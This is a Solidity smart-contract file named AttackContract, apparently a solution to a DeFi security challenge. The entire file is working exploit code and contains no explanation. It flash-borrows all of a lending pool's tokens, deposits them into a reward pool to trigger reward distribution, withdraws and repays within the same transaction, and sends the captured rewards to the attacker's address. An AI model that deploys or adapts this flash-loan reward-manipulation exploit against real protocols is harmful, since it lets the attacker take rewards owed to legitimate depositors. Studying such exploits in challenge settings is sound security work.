// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface IFlashPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

contract AttackContract {
    address private immutable attacker;
    IERC20 private immutable liqToken;
    IERC20 private immutable rewardToken;
    IFlashPool private immutable lendingPool;
    IRewardPool private immutable rewardPool;

    constructor(address _rewardPoolA, address _lendingPoolA, address _liqTokenA, address _rewardTokenA) {
        attacker = msg.sender;
        liqToken = IERC20(_liqTokenA);
        rewardToken = IERC20(_rewardTokenA);
        lendingPool = IFlashPool(_lendingPoolA);
        rewardPool = IRewardPool(_rewardPoolA);
    }

    function attack() external {
        uint256 balance = liqToken.balanceOf(address(lendingPool));
        lendingPool.flashLoan(balance);
    }

    function receiveFlashLoan(uint256 amount) public {
        liqToken.approve(address(rewardPool), amount);
        rewardPool.deposit(liqToken.balanceOf(address(this)));
        uint256 reward = rewardPool.distributeRewards();
        rewardPool.withdraw(amount);

        liqToken.transfer(address(lendingPool), amount);
        rewardToken.transfer(attacker, reward);
    }
}
